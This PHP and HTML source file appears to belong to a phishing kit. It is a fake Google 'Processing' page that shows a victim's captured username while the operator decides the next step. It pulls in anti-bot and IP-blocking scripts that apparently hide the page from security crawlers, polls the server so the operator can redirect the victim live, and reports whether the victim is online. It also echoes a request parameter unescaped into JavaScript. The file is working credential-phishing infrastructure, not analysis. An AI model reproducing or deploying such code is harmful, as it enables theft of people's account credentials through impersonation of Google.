<?php
error_reporting(0);
include('/../Antibot/Bot-Crawler.php');
include('/../Antibot/Dila_DZ.php');
include('/../Antibot/blockers.php');
include('/../Antibot/detects.php');

// pages/waiting.php
require_once __DIR__ . '/../includes/functions.php';
checkBlockedIP();  // Block access if IP is blocked
require_once __DIR__ . '/../includes/functions.php';

$sessionId = $_GET['session_id'] ?? null;
if (!$sessionId) {
    header('Location: ../index.php');
    exit;
}

$sess = getSession($sessionId);
if (!$sess) {
    header('Location: ../index.php');
    exit;
}
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing - Google</title>
    <link rel="stylesheet" href="res/css/style.css">
    <style>
        .loading-spinner {
            width: 24px;
            height: 24px;
            border: 3px solid #dadce0;
            border-radius: 50%;
            border-top-color: #1a73e8;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .loading-text {
            color: #202124;
            font-size: 16px;
            text-align: center;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }


        .loading-subtext {
            color: #5f6368;
            font-size: 14px;
            text-align: center;
        }

        .loading-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 48px 24px;
        }

        /* Add loading bar animation */
        .signin-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 3px;
            background: #0b57d0;
            animation: loading 1.2s ease-in-out infinite;
        }

        @keyframes loading {
            0% {
                left: -100px;
            }
            100% {
                left: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="signin-card">
            <div class="signin-left">
                <div class="logo-container">
                    <svg class="google-logo" viewBox="0 0 40 48" width="48" height="48" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
                    </svg>
                </div>
                <h1>Processing</h1>
                <p class="subtitle">Please wait while we verify your information</p>
                <div class="user-email">
                    <svg aria-hidden="true" class="user-icon" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM12 5c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                    </svg>
                    <span><?php echo htmlspecialchars($sess['username']); ?></span>
                    <svg aria-hidden="true" class="dropdown-icon" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                        <path d="M7 10l5 5 5-5z"></path>
                    </svg>
                </div>
            </div>
            
            <div class="signin-right">
                <div class="loading-content">
                    <div class="loading-spinner"></div>
                    <p class="loading-text">Processing your request</p>
                    <p class="loading-subtext">This may take a few moments</p>
                </div>
            </div>
        </div>

        <div class="footer">
            <select class="language-select">
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
	
<script>
  setInterval(function(){
    fetch('../update_online.php?session_id=<?php echo $sessionId; ?>');
  }, 3000);
  
const sessionId = "<?php echo $sessionId; ?>";
setInterval(function(){
    fetch('../poll_status.php?session_id=' + sessionId)
    .then(r => r.json())
    .then(data => {
        if (data.status && data.status !== 'waiting') {
            window.location.href = data.status + '.php?session_id=' + sessionId;
        }
    });
}, 2000);
</script>
</body>
</html>